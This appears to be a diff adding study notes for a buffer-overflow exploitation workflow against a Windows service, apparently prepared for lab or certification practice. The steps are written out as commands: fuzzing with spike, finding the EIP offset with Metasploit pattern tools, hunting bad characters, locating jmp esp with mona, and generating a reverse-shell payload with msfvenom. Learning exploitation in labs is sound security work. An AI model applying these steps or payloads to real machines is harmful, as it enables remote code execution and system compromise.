@@ -1,0 +1,20 @@
+ALL PYTHON SCRIPTS WERE CREATED BY ME. ANY EXACT MATCH IS PURELY A COINCIDENCE
+
+use nc -nv *ip* *port*, then use test.py, changing the IP address to match the victim machine.
+use the spike.spk script, changing "TRUN " or "STATS " to whatever may need to be tested
+	generic_send_tcp *test ip address* *port* spike.spk 0 0 
+use fuzz.py, changing the IP address to find the bytes at where it crashes.
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l *round up on bytes that crashed*
+use offset.py using the pattern from step 4
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l *round up on bytes that crashed* -q *EIP finding* 
+	the above will tell you the exact match location
+use overwriteeip.py to make sure EIP is completely overwritten
+use badchars.py 
+In Immunity Debugger, right click the ESP value, follow in dump, and search through hex dump for the bad charcters. Write them all down. NOTE: \x00 is always a bad character.
+	it goes 1-9, a-f, then 10, through 90. then it goes a0-a9, then aa-af, through ff.
+use !mona modules and look for the appropriate module (hopefully all false)
+use !mona jmp -r esp -m *module* to find if a jmp esp module exists.
+	in the list the shows, just go down the list in the python script on line 15 until one works
+Modify lilendian.py with jmp esp number, and find the jmp esp in immunity, press F2 to set the break point, run lilendian.py (NOTE: don't forget the x in the \x** and any letters must be capatilized)
+msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> EXITFUNC=thread -b "bad chars" -f py (with and without x64)
+take the overflow and put it in shell.py. Set up a listener to the one set in shell.py, then Test against lab first, then attack machine
